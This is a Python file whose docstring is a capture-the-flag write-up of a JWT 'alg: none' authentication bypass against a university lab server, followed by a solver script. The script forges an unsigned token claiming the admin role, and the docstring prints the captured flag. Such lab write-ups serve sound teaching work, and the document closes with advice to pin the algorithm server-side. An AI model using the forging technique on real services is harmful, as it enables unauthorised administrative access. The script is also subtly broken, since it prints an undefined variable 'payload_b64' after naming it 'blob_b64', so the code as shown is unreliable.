"""
Token of Trust -- JWT "alg: none" authentication bypass.

    "The Vault issues a session token when you log in and checks it before
     letting anyone into /admin. You have a guest account; the admin area is
     off-limits... or is it? You will NOT need to know, guess, or crack the
     server's secret key."
    Target: http://cns-test.idlab.uantwerpen.be:50009

From problem to solution
------------------------
1. Get a token and read it. GET /login hands out a JWT. A JWT is three
   base64url parts joined by dots -- header.payload.signature -- so decode the
   first two (the signature is raw HMAC bytes, not meant to be read):

       header  = {"alg":"HS256","typ":"JWT"}
       payload = {"user":"guest","role":"user"}

   So the server signs the payload with HMAC-SHA256 (HS256) under a secret key,
   and authorises based on the `role` field. We want role="admin".

2. See how /admin consumes it. The token travels in the header
   `Authorization: Bearer <token>`. Replaying the guest token verifies fine and
   /admin answers `role=user` -- so the role in the token is exactly what it
   trusts. Editing `role` to `admin` and re-signing is impossible without the
   secret key... so we must not need the signature at all.

3. The flaw: the server trusts the `alg` HEADER. JWT lets the *token* declare
   which algorithm verifies it, and "none" is a legal algorithm meaning
   "unsecured -- no signature". A safe verifier pins the expected algorithm and
   rejects "none"; a vulnerable one reads alg from the attacker-controlled
   header and, seeing "none", skips signature verification entirely.

   So forge a token with NO key:
       header    = {"alg":"none","typ":"JWT"}
       payload   = {"user":"guest","role":"admin"}
       signature = ""                      (empty -- note the trailing dot)

   Send `header.payload.` and the server "verifies" it (there is nothing to
   verify) and reads role=admin.

Result
------
    forged token: <b64url header>.<b64url payload>.      (empty signature)
    flag        : CNS{never_trust_the_alg_header}

The live server accepts every casing of "none" (none/None/NONE), so it is fully
vulnerable -- it never checks the algorithm at all.

Lesson: a signature only proves authenticity if the VERIFIER decides the
algorithm, not the token. Trusting the `alg` header lets an attacker downgrade
to "none" (or, in the RS256->HS256 variant, trick the server into verifying with
the public key as an HMAC secret). Always pin the expected algorithm server-side
and reject "none".
"""
import base64
import json
import urllib.request
import urllib.error

HOST = "http://cns-test.idlab.uantwerpen.be:50009"


def b64url(raw: bytes) -> str:
    """base64url with padding stripped, as JWT uses."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def encode_part(obj) -> str:
    return b64url(json.dumps(obj, separators=(",", ":")).encode())


def get(path, token=None):
    headers = {"Authorization": "Bearer " + token} if token else {}
    req = urllib.request.Request(HOST + path, headers=headers)
    try:
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def solve():
    # 1. Log in and inspect the issued token.
    _, body = get("/login")
    token = json.loads(body)["token"]
    header_b64, blob_b64, _sig = token.split(".")
    print("issued header :", b64url_decode(header_b64).decode())
    print("issued payload:", b64url_decode(payload_b64).decode())

    # 2. Baseline: the guest token is accepted as role=user.
    print("guest @ /admin:", get("/admin", token)[1])

    # 3. Forge an unsigned "alg: none" token claiming admin.
    forged = (
        encode_part({"alg": "none", "typ": "JWT"})
        + "."
        + encode_part({"user": "guest", "role": "admin"})
        + "."  # empty signature
    )
    status, resp = get("/admin", forged)
    print(f"forged @ /admin: {status}: {resp}")


if __name__ == "__main__":
    solve()
